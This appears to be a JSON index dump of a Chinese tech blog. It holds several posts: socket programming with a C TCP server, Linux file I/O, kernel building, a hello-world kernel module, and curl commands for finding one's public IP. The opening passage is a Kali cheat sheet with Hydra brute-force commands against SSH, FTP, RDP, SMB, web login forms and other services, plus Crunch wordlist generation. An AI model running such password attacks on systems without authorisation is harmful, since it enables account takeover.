login/password pair for any host (for usage with -M) -M FILE server list for parallel attacks, one entry per line -o FILE write found login/password pairs to FILE instead of stdout -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1 -t TASKS run TASKS number of connects in parallel (default: 16) -m OPTIONS module specific options. See hydra -U &lt;module&gt; what options are available. -w TIME defines the max wait time in seconds for responses (default: 32) -w TIME 设置最大超时的时间，单位秒，默认是32s。 -W TIME defines a wait time between each connection a task performs. This usually only makes sense if a low task number is used, .e.g -t 1 -c TIME the wait time in seconds per login attempt over all threads (-t 1 is recommended) This usually only makes sense if a low task number is used, .e.g -t 1 -4 / -6 prefer IPv4 (default) or IPv6 addresses -v / -V verbose mode / show login+pass combination for each attempt -d debug mode -I ignore an existing restore file (dont wait 10 seconds) -h, --help Show summary of options. 针对破解主要看破解密码字典够不够强大： crunch 工具 Crunch是一种创建密码字典工具，该字典通常用于暴力破解 rtgen 工具 Rtgen工具用来生成彩虹表。彩虹表是一个庞大的和针对各种可能的字母组合预先计算好的哈希值的集合, 数据量比较大 破解示例： 破解ssh: 1hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip sshhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 破解ftp: 1hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ftp -l 用户名 -P 密码字典 -e ns -vV get方式提交，破解web登录: 1hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php post方式提交，破解web登录: 1hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot; 1hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &quot;login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;&quot; （参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,中的内容是表示错误猜解的返回信息提示。） 破解https: 1hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 破解teamspeak 1hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 破解cisco: 1hydra -P pass.txt 10.36.16.18 ciscohydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 破解smb: 1hydra -l administrator -P pass.txt 10.36.16.18 smb 破解pop3: 1hydra -l muts -P pass.txt my.pop3.mail pop3 破解rdp: 1hydra ip rdp -l administrator -P pass.txt -V 破解http-proxy: 1hydra -l admin -P pass.txt http-proxy://10.36.16.1 破解imap: 1hydra -L user.txt -p secret 10.36.16.18 imap PLAINhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN Crunch 工具使用:Mac 安装:1brew install crunch 启动说明 12345678crunch version 3.6Crunch can create a wordlist based on criteria you specify. The outout from crunch can be sent to the screen, file, or to another program.Usage: crunch &lt;min&gt; &lt;max&gt; [options]where min and max are numbersPlease refer to the man page for instructions and examples on how to use crunch. 1crunch [minimum length] [maximum length] [character set] [options] ​ 常用参数 123456crunch命令常用的选项如下所示。+-o：用于指定输出字典文件的位置。-b：指定写入文件最大的字节数。该大小可以指定KB、MB或GB，但是必须与-o START选项一起使用。-t：设置使用的特殊格式。-l：该选项用于当-t选项指定@、%或^时，用来识别占位符的一些字符。 ​ 示例: 1234567891011#&gt; crunch 5 8 qwertyuio -o ~/Downloads/crunch.txtCrunch will now generate the following amount of data: 429758622 bytes409 MB0 GB0 TB0 PBCrunch will now generate the following number of lines: 48420180crunch: 61% completed generating outputcrunch: 100% completed generating output","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/渗透/"},{"name":"Kali","slug":"Kali","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kali/"}]},{"title":"Socket 网络编程","slug":"cpluscplus/Socket-网络编程","date":"2017-09-18T01:03:48.000Z","updated":"2018-11-19T16:04:51.156Z","comments":true,"path":"2017/09/18/cpluscplus/Socket-网络编程/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/09/18/cpluscplus/Socket-网络编程/","excerpt":"1. TCP与UDP ​ TCP是一种面向连接的保证可靠传输的协议。通过TCP协议传输，得到的是一个顺序的无差错的数据流。发送方和接收方的成对的两个socket之间必须建立连接，以便在TCP协议的基础上进行通信，当一个socket（通常都是server socket）等待建立连接时，另一个socket可以要求进行连接，一旦这两个socket连接起来，它们就可以进行双向数据传输，双方都可以进行发送或接收操作。 ​ UDP是一种面向无连接的协议，每个数据报都是一个独立的信息，包括完整的源地址或目的地址，它在网络上以任何可能的路径传往目的地，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的。","text":"1. TCP与UDP ​ TCP是一种面向连接的保证可靠传输的协议。通过TCP协议传输，得到的是一个顺序的无差错的数据流。发送方和接收方的成对的两个socket之间必须建立连接，以便在TCP协议的基础上进行通信，当一个socket（通常都是server socket）等待建立连接时，另一个socket可以要求进行连接，一旦这两个socket连接起来，它们就可以进行双向数据传输，双方都可以进行发送或接收操作。 ​ UDP是一种面向无连接的协议，每个数据报都是一个独立的信息，包括完整的源地址或目的地址，它在网络上以任何可能的路径传往目的地，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的。 TCP与UDP区别： TCP特点： ​ TCP是面向连接的协议，通过三次握手建立连接，通讯完成时要拆除连接，由于TCP是面向连接协议，所以只能用于点对点的通讯。而且建立连接也需要消耗时间和开销。 ​ TCP传输数据无大小限制，进行大数据传输。​ TCP是一个可靠的协议，它能保证接收方能够完整正确地接收到发送方发送的全部数据。 2.UDP特点： ​ UDP是面向无连接的通讯协议，UDP数据包括目的端口号和源端口号信息，由于通讯不需要连接，所以可以实现广播发送。​ UDP传输数据时有大小限制，每个被传输的数据报必须限定在64KB之内。​ UDP是一个不可靠的协议，发送方所发送的数据报并不一定以相同的次序到达接收方。 TCP与UDP应用:​ TCP在网络通信上有极强的生命力，例如远程连接（Telnet）和文件传输（FTP）都需要不定长度的数据被可靠地传输。但是可靠的传输是要付出代价的，对数据内容正确性的检验必然占用计算机的处理时间和网络的带宽，因此TCP传输的效率不如UDP高。 ​ UDP操作简单，而且仅需要较少的监护，因此通常用于局域网高可靠性的分散系统中client/server应用程序。例如视频会议系统，并不要求音频视频数据绝对的正确，只要保证连贯性就可以了，这种情况下显然使用UDP会更合理一些。 2. Socket是什么 ​ Socket通常也称作”套接字”，用于描述IP地址和端口，是一个通信链的句柄。网络上的两个程序通过一个双向的通讯连接实现数据的交换，这个双向链路的一端称为一个Socket，一个Socket由一个IP地址和一个端口号唯一确定。应用程序通常通过”套接字”向网络发出请求或者应答网络请求。 Socket是TCP/IP协议的一个十分流行的编程界面，但是，Socket所支持的协议种类也不光TCP/IP一种，因此两者之间是没有必然联系的。 Socket通讯过程： ​ 服务端监听某个端口是否有连接请求，客户端向服务端发送连接请求，服务端收到连接请求向客户端发出接收消息，这样一个连接就建立起来了。客户端和服务端都可以相互发送消息与对方进行通讯。 Socket的基本工作过程包含以下四个步骤： 创建Socket 打开连接到Socket的输入输出流； 按照一定的协议对Socket进行读写操作 关闭Socket 3. Tcp:报文格式: 序号：Seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。 确认序号：Ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，Ack=Seq+1。 标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下: URG：紧急指针（urgent pointer）有效。 ACK：确认序号有效。 PSH：接收方应该尽快将这个报文交给应用层。 RST：重置连接。 SYN：发起一个新连接。 FIN：释放一个连接。 ​ 需要注意的是: 不要将确认序号Ack与标志位中的ACK搞混了. 确认方Ack=发起方Req+1，两端配对。 Tcp 三次握手: 过程: 第一次握手：Client将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。 第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，Ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。 第三次握手：Client收到确认后，检查Ack是否为J+1，标志位ACK是否为1，如果正确则将标志位ACK置为1，Ack=K+1，并将该数据包发送给Server，Server检查Ack是否为K+1，标志位ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。 优点: ​ 三次握手尽可能减少错误率， 但是三次握手并不能保证完全正确, 握手次数越多越能保证双方关系的确认 ​ 三次握手尽可能保证双方进入ESTABLISHED状态，而不发生死锁; 缺点: 传递数据建立链接，数据传递过程中，确认机制， 重传机制，堵塞机制等都会消耗大量时间，并且一般长链接设备需维护链接 syn 攻击: 三次握手过程，第二次握手, Server发送SYN-Ack之后, Server 处于SYS_RECV状态，收到Client 的Ack确认序号之前为半链接， 只有收到client发送的Ack确认包 Server才能建立完整链接， Syn攻击，就是client不断发送Syn数据包，使Server认为有IP进行链接，造成Server产生大量半链接状态的Tcp, 因为Tcp的重传与确认机制, Server不断占用Tcp请求队列， 知道队列堵塞 资源消耗殆尽，系统瘫痪; 确认Syn攻击， 只需要netstat -anp | grep port 查看链接 Server 大量处于 SYN_RECV 状态即可; ​ Tcp 四次挥手: ​ 由于TCP连接时全双工的，因此， 每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接， 收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN。首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭，上图描述的即是如此。 过程: 第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。 第二次挥手：Server收到FIN后，发送一个Ack给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。 第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。 ​ 第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。 ​ 4. Udp: 5. 同步， 异步， 堵塞，非堵塞:堵塞 与 非堵塞 同步 与 异步 6 Tcp 网络粘包问题7. 网络模型: 网络IO操作实际过程涉及到内核和调用这个IO操作的进程。以read为例，read的具体操作分为以下两个部分: 内核等待数据可读 将内核读到的数据拷贝到进程 blocking IO ( 堵塞IO ) recvfrom等到内核将数据报文准备好，并从内核态拷贝到用户态 nonblocking IO (非堵塞IO) 虽然recvfrom 不会卡在断点处，但是需要底层不断轮训内核是否存在数据，若是存在此时数据库才进行拷贝，若无数据，recvfrom 返回 -1 并且errono 被设置为 EAGAIN ​ 内核态本质不断轮询 IO multiplexing (多路IO) select poll epoll asynchronous IO (异步IO) ​ read函数直接返回，但是内核数据拷贝完成之后，会发送信号提示上层 signal driven IO (信号驱动IO) 8. Tcp 多客户端代码:程序代码 下载: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#define DEST_IP \"192.168.1.101\" //localhost eth0 ip#define LISTENPORT 33691#define DBPORT 55429extern void* func(void *);int clifd = 0 ;struct sockaddr_in srvaddr, cliaddr;int main(void)&#123; pthread_t tid; int addrlen, on; int sockfd = 0; if( (sockfd = socket(AF_INET, SOCK_STREAM, 0) ) == -1) &#123; perror(\"create socket fail\\n\"); return -1; &#125; srvaddr.sin_family = AF_INET; //srvaddr.sin_addr.s_addr = INADDR_ANY; srvaddr.sin_addr.s_addr = inet_addr(DEST_IP); srvaddr.sin_port = htons( LISTENPORT ); //采用socket; /* 重新绑定 address */ if( (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;on, sizeof(on))) &lt; 0) &#123; perror(\"setsockopt fail\"); return -1; &#125; if ( bind(sockfd, (struct sockaddr *) &amp;srvaddr, sizeof(srvaddr)) == -1 ) &#123; perror(\"bind fail\"); return -1; &#125; listen(sockfd, 5); addrlen = sizeof(cliaddr); // 多线程问题 while(1) &#123; if ( (clifd = accept( sockfd, (struct sockaddr *)&amp; cliaddr, (socklen_t *)&amp; addrlen ) )!= -1 ) // 堵塞函数; &#123; if( pthread_create(&amp;tid, NULL, &amp;func, NULL) == -1 ) &#123; perror(\"pthread_create fail\"); return -1; &#125; &#125; else &#123; perror(\"accept fail\"); return -1; &#125; &#125; close(sockfd); // fd close(); return 0;&#125;void* func (void *data)&#123; int read_size = 0; char recvbuf[BUFSIZ]; while( (read_size = recv(clifd, recvbuf, BUFSIZ, 0))) &#123; //网络字节序转化; printf(\"tid = %u, sock addr = %s, port = %d , recv = %s\",(unsigned int)pthread_self(), inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port), recvbuf); &#125; return NULL;&#125; 补充: 长链接: 短链接: 网络链接查看 netstat / ss : Wiindow: 1netstat -an |findstr 1115 // 查看1115 端口链接 Linux: 12netstat -anp |grep -i 1115 // 查看1115 端口链接 // -i 忽略大小写ss -anp | grep -i postgres","categories":[],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"}]},{"title":"linux 获取公网ip","slug":"yunwei/Linux 获取公网ip地址","date":"2017-09-14T06:28:30.000Z","updated":"2017-12-03T03:21:28.609Z","comments":false,"path":"2017/09/14/yunwei/Linux 获取公网ip地址/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/09/14/yunwei/Linux 获取公网ip地址/","excerpt":"正文: 有了它,大家就不用打开浏览器，baidu.com 输入ip 喽!","text":"正文: 有了它,大家就不用打开浏览器，baidu.com 输入ip 喽! Curl 纯文本格式输出1234567curl icanhazip.comcurl ifconfig.mecurl curlmyip.comcurl ip.appspot.comcurl ipinfo.io/ipcurl ipecho.net/plaincurl www.trackip.net/i Curl Json格式输出:123curl ipinfo.io/jsoncurl ifconfig.me/all.jsoncurl www.trackip.net/ip?json (有点丑陋) Curl XML格式输出1curl ifconfig.me/all.xml Curl 得到所有ip细节(*):1curl ifconfig.me/all","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"Linux 文件系统编程","slug":"cpluscplus/Linux-文件系统编程","date":"2017-09-12T10:31:25.000Z","updated":"2018-11-19T16:05:19.372Z","comments":true,"path":"2017/09/12/cpluscplus/Linux-文件系统编程/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/09/12/cpluscplus/Linux-文件系统编程/","excerpt":"字符设备 和 块设备都很好体现”一切皆文件”的Linux设计思想。 设备驱动最终通过操作系统的文件系统调用或C库函数被访问 以下为Linux文件操作函数:","text":"字符设备 和 块设备都很好体现”一切皆文件”的Linux设计思想。 设备驱动最终通过操作系统的文件系统调用或C库函数被访问 以下为Linux文件操作函数: Linux 系统编程:1. 创建:1int creat(const char *filename, mode_t mode); 参数mode指定新建文件的存储权限， 它同umask一起决定文件的最终权限 (mode &amp; umask ); 1int umask(int newmask); 2. 打开:12int open(const char* pathname, int flags);int open(const char* pathname, int flags, mode_t mode); flags 取值: 标示 含义 O_RDONLY 以只读方式打开文件 O_WRONLY 以只写方式打开文件 O_RDWR 以读写方式打开文件 O_APPEND 以追加方式打开文件 O_CREAT 创建一个新文件 O_EXEC 如果使用了O_CREAT 且文件已经存在，就会发生错误 O_NOBLOCK 以非堵塞方式打开一个文件 O_TRUNC 如果文件已经存在,则删除文件内容 mode取值: 标志 含义 S_IRUSR 用户可读 S_IWUSR 用户可写 S_IXUSR 用户可执行 S_IRWXU 用户可读，写，执行 S_IRGRP 组可读 S_IWGRP 组可写 S_IXGRP 组可执行 S_IRWXG 组可读，写，执行 S_IROTH 其他人可读 S_IWOTH 其他人可写 S_IXOTH 其他人可执行 S_IRWXO 其他人可读，写，执行 S_ISUID 设置uid S_ISGID 设置GID 1 执行权限 2 写权限 4 读权限 – 相互配合组合 UID 设置文件执行阶段具有文件所有者权限 GID 只对目录有效，设置该位后,任何用户在此目录下创建文件都具有和该目录所属组想同 chmod u+s filename; // set uid chmod g+s dirname; // set gid 3. 读写:12int read(int fd, const void* buf, size_t length);int write(int fd, const void* buf, size_t length); 4. 定位:1int lseek(int fd, offset_t offset, int whence); lseek() 将文件读写指针相对whence移动offset字节， 操作成功，返回指针相对于文件头的位置。 where取值: SEEK_SET : 相对于文件开头 SEEK_CUR : 相对文件读写指针的当前位置 SEEK_END : 相对文件末尾 文件长度 = lseek(fd, 0, SEEK_END); 关闭: 1int close(int fd); C 库操作1. 创建和打开1FILE *fopen(const char *filename, const char *mode); mode 取值: 标志 含义 r, rb 以只读方式打开 w, wb 以只写方式打开, 文件不存在，则创建文件，否则文件被截断 a, ab 以追加方式打开，如果文件不存在，则创建文件 r+, r+b , rb+ 以读写方式打开 w+, w+b, wh+ 以读写方式打开，如果文件不存在和创建文件，否则文件被截断 a+, a+b, ab+ 以读和追加方式打开，如果文件不存在，则创建新文件 b 用于 区分二进制文件和文本文件， DOS,window系统有区分, Linux 系统并不区分二进制文件和文本文件 2. 读写: 字符，字符串为单位12345678int fgetc(FILE *stream);int fputc(int c, FILE *stream);char *fgets(char *s, int n, FILE *stream);int fputs(const char *s, FILE *stream);int fprintf(FILE *stream, const char *format, ...);int fscanf(FILE *stream, const char *format, ...);size_t fread(void *ptr, size_t size, size_t n, FILE *stream);size_t fwrite(const void *prt, size_t size, size_t n, FILE *stream); 3. C库提供读写过程中定位能力:123int fgetpos(FILE* stream, fpos_t *pos);int fsetpos(FILE* stream, const fpos_t *pos);int fseek(FILE* stream, long offset, int whence); 4. 关闭:1int fclose(FILE* stream); 5. 定位:1int fseek(FILE* stream, long offset, int whence); 补充:1. 类型转换: FILE* 与 int fd 转换:12int fileno(FILE* stream); // FILE* --&gt; intFILE* fdopen(int fd, char *mode); // int --&gt; FILE* 2. rewind:1void rewind(FILE* stream) ​ 从新将文件指针指向文件开头, 同时清除和文件流相关的错误和EOF标记, 等价于: 1fseek(stream, 0, SEEK_SET); 3. ftell:1long ftell(FILE* steram); ​ 得到文件读写指针当前位置偏离文件头的偏移字节 等价于: 1fseek(stream, 0, SEEK_CUR); ​","categories":[],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"}]},{"title":"编译Linux内核","slug":"kernel/编译Linux内核","date":"2017-09-10T01:41:02.000Z","updated":"2018-03-05T08:21:36.776Z","comments":true,"path":"2017/09/10/kernel/编译Linux内核/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/09/10/kernel/编译Linux内核/","excerpt":"前言: Linux内核是操作系统的核心，也是操作系统最基本的部分。 Linux内核的体积结构是单内核的、但是他充分采用了微内核的设计思想、使得虽然是单内核、但工作在模块化的方式下、并且这个模块可以动态装载或卸 载；Linux负责管理系统的进程、内存、设备驱动程序、文件和网络系统，决定着系统的性能和稳定性。如是我们在了解Linux内核的基础上根据自己的需要、量身定制一个更高效，更稳定的内核，就需要我们手动去编译和配置内核里的各项相关的参数和信息了。注意: 如果两个内核模块的版本不完全相同是不可以跨版本使用的。","text":"前言: Linux内核是操作系统的核心，也是操作系统最基本的部分。 Linux内核的体积结构是单内核的、但是他充分采用了微内核的设计思想、使得虽然是单内核、但工作在模块化的方式下、并且这个模块可以动态装载或卸 载；Linux负责管理系统的进程、内存、设备驱动程序、文件和网络系统，决定着系统的性能和稳定性。如是我们在了解Linux内核的基础上根据自己的需要、量身定制一个更高效，更稳定的内核，就需要我们手动去编译和配置内核里的各项相关的参数和信息了。注意: 如果两个内核模块的版本不完全相同是不可以跨版本使用的。 正文: 获取内核源码， 并进行解压 内核下载 1tar -xvf linux-xxx.tar.gz ​ 配置内核特性(选择一种方法就可以了) 现有编译选项: 123456make config：遍历选择所要编译的内核特性make allyesconfig：配置所有可编译的内核特性make allnoconfig：并不是所有的都不编译make menuconfig：这种就是打开一个文件窗口选择菜单make kconfig(KDE桌面环境下，并且安装了qt开发环境)make gconfig(Gnome桌面环境，并且安装gtk开发环境) 内核模块 1234567891011121314151617[*] 64-bit kernel # 64bit 支持 General setup ---&gt; # 基本设置[*] Enable loadable module support ---&gt; # 模块加载支持-*- Enable the block layer ---&gt; # 块设备层支持 Processor type and features ---&gt; # 处理器类型和特性选择 Power management and ACPI options ---&gt; # 电源管理功能 Bus options (PCI etc.) ---&gt; # 总线选项 Executable file formats / Emulations ---&gt; # 可执行文件格式-*- Networking support ---&gt; # 网络支持 Device Drivers ---&gt; # 设备驱动 Firmware Drivers ---&gt; # 固件驱动 File systems ---&gt; # 文件系统 Kernel hacking ---&gt; # 内核技巧 Security options ---&gt; # 安全选项-*- Cryptographic API ---&gt; # 密码相关API[*] Virtualization ---&gt; # 虚拟化 Library routines ---&gt; # 函式库 基本设置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556[ ] Prompt for development and/or incomplete code/drivers # 尚未完成开发的代码或驱动，求稳不选 ( ) Cross-compliler tool prefix # 交叉编译前缀，用不到不选 ( ) Local version - append to kernel release[ ] Automatically append version infomation to the version string # 以上两项用于自定义内核的版本描述，无意义不设 Kernel compression mode (XZ) ---&gt; # 内核压缩算法，有 Gzip,Bzip2,LZMA,XZ,LZO 几个选项 # 选择了较新的 XZ ，有较高的压缩比和解压缩速度( ) Default hostname # 用户未设置 hostname 时的默认值，无意义不设 [*] Support for paging of anonymous memory (swap) # swap 虚拟内存支持，必选[*] System V IPC # 进程间通信，必选[ ] Open by fhandle syscalls # 支持通过文件句柄的系统调用，开发文件系统时可能用到，一般用户可不选 [ ] Auditing support [ ] Enable system-call auditing support [ ] Make audit loginuid immutable # 审计支持，安装 SELinux 必选，但会拖慢系统，一般用户可不选 IRQ Subsystem ---&gt;# 中断请求子系统，64位系统下面木有选项，免选了Timers Subsystem ---&gt; [*] Tickless System (Dynamic Ticks) # 计时子系统，Tickless系统可降能耗，选上 [ ] High Resolution Timer Support # 高精度计时器需要硬件支持，一般硬件不支持，不选CPU/Task time and stats accounting ---&gt; Cputime accounting (Simple tick based cputime accounting) ---&gt; (X) Simple tick based cputime accounting ( ) Fine granularity task level IRQ time accounting # 统计进程占用CPU时间的方式，这里选择 Simple tick 方式 [*] BSD Process Accounting # 将进程的统计信息写入文件，支持用户级系统调用，必选 [*] BSD Process Accounting version 3 file format # 使用第三版文件格式，不兼容老版本，淘汰老文件格式，选了 [ ] Export task/process statistics through netlink (EXPERIMENTAL) # 通过netlink接口向用户空间导出统计信息，可不选 [ ] Enable per-task delay accounting (EXPERIMENTAL) # 在统计信息中包含进程等待资源所花费的时间，可不选 [ ] Enable extended accounting over taskstats (EXPERIMENTAL) [ ] Enable pre-task storage I/O accounting (EXPERIMENTAL) # 在统计信息中包含额外的信息，可不选 ​ 编译内核 123make -j x // x号最多为CPU物理核心总数的两倍，这样会快点哦 make headers // 很多Makefile 不在支持make modules ​ 安装内核模块 12make header_install //可忽略make modules_install ​ 安装内核 1make install #会自动更新grub.conf 文件 若失败 update-grub2 手动执行，并查看文件是否更新 ​ 验证并测试 12cat /boot/grub/grub.conf查看新内核是否已经添加, 而后重启系统并测试 ​ 清理 1234make mrproper命令会删除所有的编译生成文件、内核配置文件(.config文件)和各种备份文件，所以几乎只在第一次执行内核编译前才用这条命令。 #重新配置make menuconfig 之前运行make clean命令则是用于删除大多数的编译生成文件，但是会保留内核的配置文件.config，还有足够的编译支持来建立扩展模块。所以你若只想删除前一次编译过程的残留数据，只需执行make clean命令。执行make mrproper 之前 会先调用 make clean; ​ ​ 单内核, 微内核: 单内核(宏内核): 单内核将操作系统从整体作为一个单独的大过程来实现，同时也运行在一个单独的地址空间上。这样的内核通常以单个静态二进制文件的形式存放于磁盘中。 各个进程，模块都运行在内核态，并处于同一地址空间: 内核可以直接调用 微内核: 微内核的功能被划分为多个独立过程，每个过程叫做一个服务器 只有强烈请求特权服务的服务器才运行在特权模式下，其他服务运行在用户空间 所有服务都保持独立并运行在各自的地址空间中( 通过 消息传递处理微内核通讯 IPC机制等) IPC机制开销多余函数调用，且涉及内核空间和用户空间的上下文切换 Linux内核是单内核:(Linux内核运行在单独的内核地址空间上) Linux引用模块化设计，抢占式内核，支持内核线程以及动态装载内核模块 很多服务运行在内核态，即避免IPC调用，直接采用函数调用 ​","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Arm/"},{"name":"Kernel","slug":"Kernel","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kernel/"}]},{"title":"内核模块hello_module介绍","slug":"kernel/内核模块-hello-module介绍","date":"2017-09-08T01:15:09.000Z","updated":"2018-11-19T16:14:00.399Z","comments":true,"path":"2017/09/08/kernel/内核模块-hello-module介绍/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/09/08/kernel/内核模块-hello-module介绍/","excerpt":"Linux内核结构: Device Drivers 设备驱动 Linux 内核中大量代码在设备驱动程序部分，用于控制特定的硬件设备 Linux 驱动一般分为网络设备， 块设备， 字符设备， 杂项设备 网络协议栈 内核网络协议栈为Linux提供了丰富的网络协议实现 ​","text":"Linux内核结构: Device Drivers 设备驱动 Linux 内核中大量代码在设备驱动程序部分，用于控制特定的硬件设备 Linux 驱动一般分为网络设备， 块设备， 字符设备， 杂项设备 网络协议栈 内核网络协议栈为Linux提供了丰富的网络协议实现 ​ 1. 准备工作 Debian: 编译内核模块的准备 1sudo apt-get install module-assistant #获取模块助手 Fedora: kernel-dedel 包包含了编译Fedora内核模块的所有必要文档和工具 1sudo yum install kernel-devel 内核源码下载: http://kernel.org 将内核放置到非超级用户目录下： 尽量少用sudo 等提权命令 cd linux-&lt;version&gt;make menuconfig 生成 .config 规则文件 ​ make help 帮助文档 Configuration targets: ​ menuconfig - Update current config utilising a menu based program​ oldconfig - Update current config utilising a provided .config as base Other generic targets: ​ all - Build all targets marked with [*]​ vmlinux - Build the bare kernel​ modules - Build all modules Kernel packaging: ​ rpm-pkg - Build both source and binary RPM kernel packages​ binrpm-pkg - Build only the binary kernel RPM package​ deb-pkg - Build both source and binary deb kernel packages​ bindeb-pkg - Build only the binary kernel deb package​ tar-pkg - Build the kernel as an uncompressed tarball​ targz-pkg - Build the kernel as a gzip compressed tarball​ tarbz2-pkg - Build the kernel as a bzip2 compressed tarball​ tarxz-pkg - Build the kernel as a xz compressed tarball Linux kernel internal documentation in different formats (DocBook): ​ htmldocs - HTML​ pdfdocs - PDF​ psdocs - Postscript​ xmldocs - XML DocBook​ mandocs - man pages​ installmandocs - install man pages generated by mandocs to INSTALL_MAN_PATH ​ (default: ./usr) ​ cleandocs - clean all generated DocBook files sudo tar -C / -xvf linux-&lt;version&gt;.tar 安装内核 / make modules_install / make install ​ 内核配置: 使用menuconfig #make menuconfig 生成.config配置文件 2. 驱动模块编程: ​ printk相当于printf的孪生姐妹，她们一个运行在用户态，另一个则在内核态被人们所熟知。但是根据不同的操作系统也会有不一样的效果，例如编写一个hello word 内核模块，使用这个函数不一定会将内容显示到终端上，但是一定在内核缓冲区里，可以使用dmesg.查看效果。 hello内核模块功能: ​ printk 在内核中打印信息 ​ 输出到内核的消息缓存kernel Message buffer 并拷贝到 /var/log/message中 /var/log/syslog /var/log/kern.log hello_module 模块下载 编写Hello Module必要头文件: &lt;linux/module.h&gt; 12MODELE_LICENSE(_license) 遵循开放协议 GPLMODULE_AUTHOR(_author) 代码作者 &lt;linux/init.h&gt; 包含初始化宏定义的头文件。 12module_init(x) module_exit(x) 模块编写: hello_printk.c: 123456789101112131415161718192021#include &lt;linux/init.h&gt; // 模块加载;#include &lt;linux/module.h&gt; // GPL协议MODULE_LICENSE(\"Dual BSD/GPL\");//可无;MODULE_AUTHOR(\"Rocky_Ansi\");// __init关键字告诉内核这个代码只会被运行一次，而且是在内核装载的时候。static int __init hello_init(void)&#123; printk(KERN_WARNING \"Welcome hello-module init\\n\"); return 0;&#125;// __exit关键字告诉内核这段代码只在内核模块被卸载的时候运行一次.static void __exit hello_exit(void)&#123; printk(KERN_WARNING \"Byebye hello-module exit\\n\");&#125;module_init(hello_init);module_exit(hello_exit); ​ Makefile: 123456789101112131415161718192021222324#!/bin/bash#obj-m指出将要编译成的内核模块列表。.o格式文件会自动地有相应的.c文件生成#y build directly into the kernel#n leave entirely out of the kernel#m Build as a module, to be loaded if needed.#? print a bried descriptive message and repeat the prompt.obj-m += hello.o#CFLAGS += /home/Postgres/ubuntu-src/iTop4412_Kernel_3.0/include #KDIR表示是内核源代码的位置。 链接到包含着正在使用内核对应源代码的目录树位置。KDIR := /home/Postgres/ubuntu-src/iTop4412_Kernel_3.0#PWD指示了当前工作目录并且是我们自己内核模块的源代码位置PWD ?= $(shell pwd)#M= 指定hello.c Makefile所在目录 all: make -C $(KDIR) $(CFLAGS) M=$(PWD) modules.PHONY:clean: rm -rf *.o 编译流程: 第一条红线: 进入Linux源码中，调用版本信息 以及 一些头文件。 整个Linux的源码文件 第二条橙线: 